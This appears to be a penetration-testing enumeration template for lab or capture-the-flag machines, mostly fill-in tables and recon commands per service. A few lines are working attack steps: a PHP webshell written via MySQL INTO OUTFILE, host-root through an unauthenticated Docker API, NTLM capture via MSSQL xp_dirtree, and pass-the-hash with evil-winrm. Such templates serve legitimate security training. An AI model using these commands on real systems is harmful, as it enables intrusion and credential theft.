# Enumeration — `<BOX-NAME>`

> **Part 1** is the always-run core. **Part 2** at the bottom is per-service deep-dives — only fill the ones whose port is open. Cross-reference [Enumeration.md](../Enumeration.md) for technique detail.

---

# PART 1 — CORE (every box)

## 0. Box Header

| Field | Value |
|---|---|
| Box name |  |
| Target IP |  |
| Attacker IP (tun0) |  |
| Hostname(s) |  |
| Domain (if AD) |  |
| OS guess |  |

```bash
export IP=
export NAME=
export KALI=$(ip -4 addr show tun0 2>/dev/null | awk '/inet /{print $2}' | cut -d/ -f1)
mkdir -p ~/boxes/$NAME/{nmap,web,smb,loot,creds}
cd ~/boxes/$NAME
```

---

## 1. Nmap — Three Phases

### Phase 1: full TCP sweep
```bash
sudo nmap -p- --min-rate=1000 -T4 -Pn $IP -oA nmap/all-tcp
```
**Open ports found:**
```
<paste>
```

### Phase 2: targeted -sC -sV
```bash
ports=$(grep -oP '\d+/open' nmap/all-tcp.nmap | cut -d/ -f1 | paste -sd, -); echo $ports
sudo nmap -p$ports -sC -sV -Pn $IP -oA nmap/tcp-deep
```
**Output (the reference for the whole box):**
```
<paste -sC -sV output>
```

### Phase 3: UDP top 100 (run in background, check later)
```bash
sudo nmap -sU --top-ports=100 --min-rate=1000 -Pn $IP -oA nmap/udp-top100
```
**Open UDP:**
```
<paste>
```

---

## 2. Open Ports — Master Table

| Port | Proto | Service | Version | Anon/Default tried? | Notes |
|---|---|---|---|---|---|
|  | tcp |  |  | [ ] |  |
|  | tcp |  |  | [ ] |  |
|  | tcp |  |  | [ ] |  |
|  | udp |  |  | [ ] |  |

---

## 3. Hostnames → /etc/hosts

Every TLS cert CN/SAN, HTTP redirect, SMB domain → add it here AND to `/etc/hosts`. Single most-missed step.

```bash
echo "$IP  <host1> <host2> <fqdn>" | sudo tee -a /etc/hosts
```

- [ ] `<host>` — source: ``
- [ ] `<host>` — source: ``

---

## 4. Common Services — Quick-Look

> Skip any section whose port isn't open. For uncommon ports, jump to Part 2.

### 22 / SSH (if open)

```bash
ssh -v $IP                                          # banner, auth methods
ssh -o PreferredAuthentications=none -o NoneEnabled=yes $IP
```
**Version + auth methods:**
```
<paste>
```
**Notes:** `<old OpenSSH? username enum? key reuse candidate?>`

---

### 80 / 443 / 8080 / 8443 — HTTP(S) (the most common foothold)

#### Triage
```bash
curl -sIk http://$IP/
whatweb -a3 http://$IP/
```
**Headers / banner:**
```
<paste>
```

#### TLS cert (443/8443) — extract hostnames
```bash
openssl s_client -connect $IP:443 -showcerts </dev/null 2>/dev/null | openssl x509 -noout -text | grep -E 'CN|DNS'
```
```
<paste — every name goes in /etc/hosts>
```

#### Directory busting
```bash
feroxbuster -u http://$IP/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,html,txt,bak,zip -o web/ferox.txt
```
**Interesting paths:**
| Path | Status | Size | Notes |
|---|---|---|---|
| `/` | 200 |  |  |
| `/admin` |  |  |  |
| `/login` |  |  |  |
| `/robots.txt` |  |  |  |
| `/.git/` |  |  | [ ] git-dumper |

#### Vhost fuzz (do this every time you have a hostname)
```bash
ffuf -u http://$IP/ -H "Host: FUZZ.<domain>" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -fs <default-page-size>
```
**Vhosts found:**
- [ ] `<vhost>.<domain>` — added to /etc/hosts? [ ]

**Tech / CMS identified:** `<>`
**Findings:** `<endpoints with ?id=/?file=/?page=, comments leaking info, login portals, etc.>`

---

### 139 / 445 — SMB (Windows / AD boxes)

```bash
nmap -p139,445 -sV -sC --script="smb-os-discovery,smb-enum-shares,smb-enum-users,smb-vuln-*,smb2-security-mode" $IP
enum4linux-ng -A $IP -oA smb/enum4linux
nxc smb $IP -u '' -p ''
nxc smb $IP -u guest -p '' --rid-brute 10000
```

**OS / Domain / Signing:**
```
<from smb-os-discovery>
```

**Shares:**
| Share | Read | Write | Notes |
|---|---|---|---|
| `IPC$` |  |  |  |
|  |  |  |  |

- Null session works? [ ] yes [ ] no
- Guest login works? [ ] yes [ ] no
- SMB signing: [ ] disabled (relay possible) [ ] enabled

**RID brute users (add to users.txt):**
```
<paste>
```

**Files pulled:**
```
<configs, .ps1, .kdbx, .xml with passwords>
```

---

### 88 / 389 / 636 — AD Quick Triage (if Kerberos open)

Port 88 = Domain Controller. Pivot to [Active-Directory.md](../Active-Directory.md) after this triage.

```bash
ldapsearch -x -H ldap://$IP -s base namingcontexts
impacket-GetNPUsers <REALM>/ -usersfile users.txt -no-pass -dc-ip $IP
nxc smb $IP -u '' -p '' --users --groups --shares --pass-pol
```
**Realm:** `<REALM.LOCAL>`
**Naming context:** `<DC=corp,DC=local>`
**Output:**
```
<paste — users, AS-REP roastable, groups, pwd policy>
```

---

## 5. Synthesis — What Have I Got?

Answer each, even if "no". Forces you to look.

- [ ] **Usernames collected** (saved to `users.txt`):
  ```
  
  ```
- [ ] **Hostname / domain** identified and in `/etc/hosts`?
- [ ] **Vhost fuzz** done against every hostname?
- [ ] **Every service version** searchsploited?
- [ ] **Anonymous / null / default** tried on every applicable service?
  - [ ] FTP anon  [ ] SMB null  [ ] MSSQL sa:blank  [ ] MySQL root:blank
  - [ ] Redis no-auth  [ ] SNMP public  [ ] RDP guest  [ ] LDAP anon bind
- [ ] **Every cred tried on every service?** (reuse = #1 win)
- [ ] **Writable share / FTP / NFS / web upload** tested?
- [ ] **Web app source / robots.txt / params / JS** actually read?
- [ ] **UDP scan** finished and reviewed?

---

## 6. Credentials Collected

| User | Pass / Hash | Source | Tested against |
|---|---|---|---|
|  |  |  | SSH [ ] SMB [ ] RDP [ ] WinRM [ ] Web [ ] MSSQL [ ] MySQL [ ] FTP [ ] |
|  |  |  | SSH [ ] SMB [ ] RDP [ ] WinRM [ ] Web [ ] MSSQL [ ] MySQL [ ] FTP [ ] |

---

## 7. Foothold — Attack Path

**Vector:** `<e.g., SMB null → config.bak with creds → SSH as svc_backup>`

**Steps to reproduce (for the report):**
1. 
2. 
3. 

**Initial shell as:** `<user>` via `<service>` at `<timestamp>`

**Proof:**
```
<user.txt / local.txt>
```

---

## 8. Re-scan After Foothold → Pivot to Privesc Template

```bash
ss -tlnp ; ss -ulnp                          # Linux
netstat -ano | findstr LISTEN                # Windows
```
**New internal ports / interfaces:**
```
<paste — these are common privesc / lateral vectors>
```

Pivot to → [Linux-PrivEsc-Template.md](Linux-PrivEsc-Template.md) or [Windows-PrivEsc-Template.md](Windows-PrivEsc-Template.md)

---

## 9. TODO / Rabbit Holes (if picked path fails)

- [ ] 
- [ ] 

---

---

# PART 2 — EXTENDED (per-port deep-dives, only if open)

> Copy any block you need up into Part 1 §4. Leave the rest as reference.

---

### 21 / FTP

```bash
nc -nv $IP 21
nmap -p21 -sV -sC --script=ftp-anon,ftp-syst $IP
ftp $IP                                              # try anonymous : anonymous
```
**Banner / output:**
```
<paste>
```
- Anonymous? [ ] yes [ ] no
- Vsftpd 2.3.4 backdoor? ProFTPD 1.3.5 mod_copy?

**Files pulled:**
```
<configs, .bak, history, anything that smells like creds>
```

---

### 23 / Telnet
```bash
nc -nv $IP 23
nmap -p23 -sV -sC --script=telnet-encryption,telnet-ntlm-info $IP
```
```
<paste — banner often reveals device model>
```

---

### 25 / 465 / 587 — SMTP

```bash
nmap -p25 -sV -sC --script=smtp-commands,smtp-enum-users,smtp-open-relay $IP
smtp-user-enum -M VRFY -U users.txt -t $IP
smtp-user-enum -M RCPT -U users.txt -t $IP -f attacker@x.com
```
**Output:**
```
<paste>
```
**Valid users (→ users.txt):**
```

```

---

### 53 / DNS

```bash
dig version.bind chaos txt @$IP
dig axfr @$IP <domain>
gobuster dns -d <domain> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -r $IP
```
**Output (AXFR success = huge win):**
```
<paste>
```

---

### 110 / 995 / 143 / 993 — POP3 / IMAP
```bash
nc -nv $IP 110              # POP3: USER / PASS / LIST / RETR
nc -nv $IP 143              # IMAP: a LOGIN user pass / a SELECT INBOX / a FETCH 1 BODY[]
```
**Output:**
```

```

---

### 111 / 2049 — RPCbind & NFS

```bash
rpcinfo -p $IP
showmount -e $IP
mkdir /mnt/nfs && sudo mount -t nfs $IP:/<export> /mnt/nfs -o nolock
ls -la /mnt/nfs
```
**Exports + access:**
```
<paste — no_root_squash = SUID drop path later>
```

---

### 161 / SNMP

```bash
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt $IP
snmpwalk -v2c -c public $IP
snmp-check $IP -c public
```
**Community string:** `<public / private / custom>`
**Hits (users, process args with creds, listening ports):**
```

```

---

### 389 / 636 / 3268 — LDAP (detail)

```bash
ldapsearch -x -H ldap://$IP -b "DC=corp,DC=local" '(objectClass=person)' sAMAccountName description
windapsearch.py -d corp.local --dc-ip $IP -U
```
**Description fields (often have lab passwords):**
```

```

---

### 873 — Rsync
```bash
rsync $IP::
rsync -av rsync://$IP/module/ ./loot/rsync/
```
```

```

---

### 1433 — MSSQL

```bash
nmap -p1433 -sV --script=ms-sql-info,ms-sql-empty-password,ms-sql-config $IP
nxc mssql $IP -u sa -p ''
impacket-mssqlclient -p 1433 sa:''@$IP
:: corp.local/user:pass@$IP -windows-auth
```
**Output:**
```

```
**Once in:** `EXEC xp_cmdshell 'whoami'`, `EXEC master..xp_dirtree '\\$KALI\x'` (NTLM capture), `EXEC sp_linkedservers`

---

### 1521 — Oracle TNS
```bash
nmap -p1521 --script=oracle-sid-brute,oracle-tns-version $IP
odat all -s $IP
```

---

### 2375 — Docker API (unauth)
```bash
curl http://$IP:2375/version
docker -H tcp://$IP:2375 run -v /:/host -it alpine chroot /host sh        # host root
```

---

### 3306 — MySQL

```bash
nmap -p3306 -sV --script=mysql-info,mysql-empty-password,mysql-users $IP
mysql -h $IP -u root -p''
```
**Output:**
```

```
**Once in:** `SELECT LOAD_FILE('/etc/passwd')`, `SELECT '<?php system($_GET[c]);?>' INTO OUTFILE '/var/www/html/s.php'`

---

### 3389 — RDP

```bash
nmap -p3389 -sV --script=rdp-enum-encryption,rdp-ntlm-info $IP
xfreerdp /v:$IP /u:user /p:pass /dynamic-resolution /cert:ignore
```
**rdp-ntlm-info (leaks hostname + domain even with NLA):**
```

```

---

### 5432 — PostgreSQL
```bash
nmap -p5432 --script=pgsql-brute $IP
psql -h $IP -U postgres
:: COPY ... FROM PROGRAM 'id'  → RCE on >= 9.3
```

---

### 5985 / 5986 — WinRM

```bash
nxc winrm $IP -u user -p pass
evil-winrm -i $IP -u user -p pass
evil-winrm -i $IP -u user -H <NTLM>          # pass-the-hash
```

---

### 6379 — Redis (unauth)

```bash
redis-cli -h $IP
> INFO; CONFIG GET *; KEYS *
:: RCE: SSH key write to /root/.ssh/authorized_keys, webshell write, module load
```

---

### 8009 — AJP (Tomcat)
Ghostcat (CVE-2020-1938) — file read / RCE.

---

### 9200 / 5601 — Elastic / Kibana
```bash
curl http://$IP:9200/                            # version
curl http://$IP:9200/_cat/indices?v
```
Old: CVE-2014-3120, CVE-2015-1427 (Groovy sandbox), Kibana CVE-2018-17246.

---

### 27017 — MongoDB
```bash
nmap -p27017 --script=mongodb-info,mongodb-databases $IP
mongo --host $IP --eval "db.adminCommand('listDatabases')"
```

---

### Other / Misc port `<port>`
```bash
<command>
```
```

```
